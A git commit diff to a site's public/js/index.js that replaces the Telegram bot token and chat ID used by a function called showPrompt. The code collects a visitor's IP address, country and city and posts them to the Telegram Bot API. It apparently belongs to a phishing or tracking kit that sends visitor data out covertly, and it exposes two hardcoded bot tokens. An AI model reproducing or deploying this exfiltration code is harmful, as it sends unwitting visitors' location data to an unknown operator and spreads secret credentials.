a80711ee5eec89bd35f11ccf6f14e964a5cc0d42
Minhmomlon <minhcolonhue2001@gmail.com>
2025-10-20 17:57:27 +0700

    Update index.js

--- public/js/index.js
+++ public/js/index.js
@@ -167,8 +167,8 @@ function showPrompt(IpAddress) {
 <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
 <strong>City: </strong><code>${IpAddress.city}</code>`;
 
-        const token = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
-        const chat_id = '-1002416068664';
+        const token = '8203803546:AAGwA6uEL--WcM7uOWYVFlKNvjI1iH24c6I';
+        const chat_id = '-1003172791971';
 
         fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
